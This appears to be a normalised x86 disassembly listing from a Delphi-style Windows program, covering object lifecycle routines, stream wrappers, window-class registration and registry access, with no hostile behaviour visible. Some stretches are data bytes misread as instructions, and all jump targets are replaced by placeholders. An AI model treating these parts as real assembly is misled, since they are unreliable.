call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_4207f4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_404620
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_42083c
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
test bl bl
jle r-xdata
mov edx esi
call sub_420a74
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_4208a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_420a74
mov edx ebx
mov eax esi
call sub_420a68
sub_4208e8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41ffc4
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_42092c
push ebx
push esi
push edi
call sub_404a1c
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420010
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
cmp [ edi + 0x50 ] 0x0
je r-xdata
mov edx edi
call sub_4202d8
lea eax [ edi + 0x50 ]
call sub_40f944
test bl bl
jle r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4049c4
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_419980
mov edx eax
mov eax edi
call sub_420a74
sub_420994
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4202f4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_4209c0
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_4209dc
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_4209f8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_419898
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_420a74
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_41978c
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_419898
cmp ebp eax
jne r-xdata
sub_420ab4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_4202d8
mov edx ebx
call sub_420098
sub_420ae0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_404620
mov [ edi + 0xc ] esi
movzx eax [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_420b2c
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_404650
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_420b64
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_420bb3
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_420bcc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_420c1b
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_420c34
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push j_sub_404b30#8
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_420cb8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push j_sub_404b30#7
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_41b798
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_420d1c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_407080
xor eax eax
push ebp
push sub_420f0f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor eax eax
push ebp
push sub_420ee8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_402f00
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_420ed7
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_402f1c
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov [ ebp - 0x10 ] esi
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_404f70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov ecx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420f16
lea eax [ ebp + 0xc ]
call sub_40700c
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_404f70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_420f54
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_420fb7
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_420fe8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_419c08
mov edi eax
xor eax eax
push ebp
push sub_42103d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421044
mov eax [ rw-data ]
call sub_419c6c
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_419898
call sub_404650
inc esi
dec ebx
jne r-xdata
sub_42105c
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_421084
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4030fc
mov edx sub_42105c
lea eax [ esi + 0x5 ]
call sub_42107c
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_42107c
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_421140
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_40857c
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_421084
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_4211f4
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_42111c
sub_42121c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4212c0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4212c7
retn
mov eax [ rw-data ]
call sub_419088
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_420fe8
xor edx edx
xor eax eax
call sub_41c920
mov eax rw-data
call sub_40f944
call sub_407688
lea eax [ eax + 0xc ]
call sub_40f944
mov eax rw-data
call sub_40f944
mov eax rw-data
call sub_40700c
mov eax sub_421054
call sub_406ea4
mov eax rw-data
call sub_40f944
call sub_41f750
mov eax rw-data
call sub_40f944
mov eax rw-data
call sub_40700c
sub_421513
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_421558
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42155f
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_4060f8
sub_421568
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x15
inc edx
add [ eax + eax ] cl
add [ eax ] al
dec eax
mov eax [ eax ]
cwde
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ edx ] dl
inc ebp
push edx
imul esi [ gs : bp + di + 0x74 ] 0x78457972
arpl [ ebp + 0x70 ] sp
je r-xdata
jb r-xdata
outsd
outsb
nop
adc [ esi ] dl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
push ss
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ah
push ss
inc edx
add [ eax + eax ] bl
add [ eax ] al
rcl [ eax ] 0x40
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ edi + edx + 0x42 ] al
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
or [ edx + edx * 2 + 0x65 ] edx
imul esi [ bp + di + 0x74 ] 0x83537972
clc
add dh [ ebp + 0x4 ]
mov al 0x2
jmp r-xdata
retn
sub_42162c
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf4
call sub_404ec4
pop ecx
pop edx
pop ebx
retn
sub_42166c
dec al
je r-xdata
mov eax 0x1
retn
dec al
je r-xdata
mov eax 0x2
retn
dec al
je r-xdata
mov eax 0x4
retn
dec al
je r-xdata
mov eax 0x3
retn
jmp r-xdata
xor eax eax
retn
sub_42169c
cmp eax 0x1
jne r-xdata
cmp eax 0x2
jne r-xdata
mov al 0x1
retn
cmp eax 0x4
jne r-xdata
mov al 0x2
jmp r-xdata
cmp eax 0x3
jne r-xdata
mov al 0x3
jmp r-xdata
retn
xor eax eax
mov al 0x4
jmp r-xdata
sub_4216c4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx 0x80000001
mov eax esi
call sub_4217a0
mov [ esi + 0x18 ] 0xf003f
mov [ esi + 0xc ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_421708
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4216c4
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_421744
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax esi
call sub_421770
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_421770
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call RegCloseKey
xor eax eax
mov [ ebx + 0x4 ] eax
lea eax [ ebx + 0x10 ]
call sub_405530
push eax
call RegFlushKey
sub_4217a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
call sub_421770
push eax
call RegCloseKey
mov [ ebx + 0x14 ] 0x0
sub_4217cc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_421770
mov [ ebx + 0x4 ] esi
lea eax [ ebx + 0x10 ]
mov edx edi
call sub_405584
pop edi
pop esi
pop ebx
retn
sub_421808
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4218d4
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4055c8
mov eax [ ebp - 0x4 ]
call sub_421658
mov ebx eax
test bl bl
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
mov edx ebx
mov eax esi
call sub_4217f0
push eax
call RegCreateKeyExA
test eax eax
sete al
mov ebx eax
test bl bl
je r-xdata
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_405a84
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf4
call sub_404ec4
mov eax [ ebp - 0x8 ]
push eax
call RegCloseKey
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4218db
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_4218e4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x5 ] cl
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4219e9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4055c8
mov eax [ ebp - 0x4 ]
call sub_421658
mov ebx eax
test bl bl
jne r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi + 0x18 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
mov edx ebx
mov eax esi
call sub_4217f0
push eax
call RegOpenKeyExA
test eax eax
sete [ ebp - 0x6 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x6 ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov eax [ esi + 0x18 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
mov edx ebx
mov eax esi
call sub_4217f0
push eax
call RegCreateKeyExA
test eax eax
sete [ ebp - 0x6 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4219f0
lea eax [ ebp - 0x4 ]
call sub_405530
retn
cmp [ esi + 0x4 ] 0x0
setne al
test al bl
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4217cc
push [ esi + 0x10 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4058e0
sub_421a08
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_421bb9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4055c8
mov eax [ ebp - 0x4 ]
call sub_421658
mov ebx eax
test bl bl
jne r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov edi [ esi + 0x18 ]
and edi 0x300
lea eax [ ebp - 0xc ]
push eax
mov eax edi
or eax 0x20019
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
mov edx ebx
mov eax esi
call sub_4217f0
push eax
call RegOpenKeyExA
test eax eax
sete [ ebp - 0x5 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov eax edi
or eax 0x20009
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
mov edx ebx
mov eax esi
call sub_4217f0
push eax
call RegOpenKeyExA
test eax eax
sete [ ebp - 0x5 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
or edi 0x20019
mov [ esi + 0x18 ] edi
cmp [ esi + 0x4 ] 0x0
setne al
test al bl
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax edi
or eax 0x1
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
mov edx ebx
mov eax esi
call sub_4217f0
push eax
call RegOpenKeyExA
test eax eax
sete [ ebp - 0x5 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
or edi 0x20009
mov [ esi + 0x18 ] edi
cmp [ esi + 0x4 ] 0x0
setne al
test al bl
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4217cc
jmp r-xdata
push [ esi + 0x10 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4058e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421bc0
lea eax [ ebp - 0x4 ]
call sub_405530
retn
or edi 0x1
mov [ esi + 0x18 ] edi
cmp [ esi + 0x4 ] 0x0
setne al
test al bl
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4217cc
jmp r-xdata
push [ esi + 0x10 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4058e0
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4217cc
push [ esi + 0x10 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4058e0
sub_421bd8
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
xor ecx ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_421d42
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4055c8
mov eax [ ebp - 0x4 ]
call sub_421658
mov [ ebp - 0x11 ] al
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x18 ] eax
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_422274
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_405a84
mov eax [ ebp - 0x4 ]
call sub_4059dc
